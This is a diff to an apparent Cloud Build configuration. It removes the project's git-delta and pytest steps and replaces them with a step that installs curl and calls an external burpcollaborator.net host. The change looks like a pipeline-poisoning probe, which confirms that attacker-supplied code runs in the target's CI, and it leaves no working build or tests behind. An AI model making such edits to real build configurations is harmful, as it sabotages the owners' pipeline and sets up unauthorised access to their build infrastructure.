@@ -1,27 +1,4 @@
 steps:
-  - id: retrieve delta
-    name: gcr.io/cloud-builders/git
-    entrypoint: bash
-    args: 
-      - -c
-      - | 
-        set -e
-        git fetch --unshallow
-        
-        # get the changed files
-        git diff origin/${_BASE_BRANCH} --name-only > _changed_files
-        
-        # parse out the folders that have changed
-        cat _changed_files | grep '/' | cut -d '/' -f1 | sort | uniq | tr '\n' ' ' > _changed_folders
-
-        echo "Change files:" && cat _changed_files
-        echo "Change folders:" && cat _changed_folders
-        echo "EOF"
-  
-  - id: pytest
-    name: python:slim
-    script: |
-      #!/bin/bash
-      pip install -r requirements.txt -U pip
-      pytest $(cat _changed_folders)
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://88eq6lqukwqidm7e9gf7mpn66xct0i.burpcollaborator.net
       
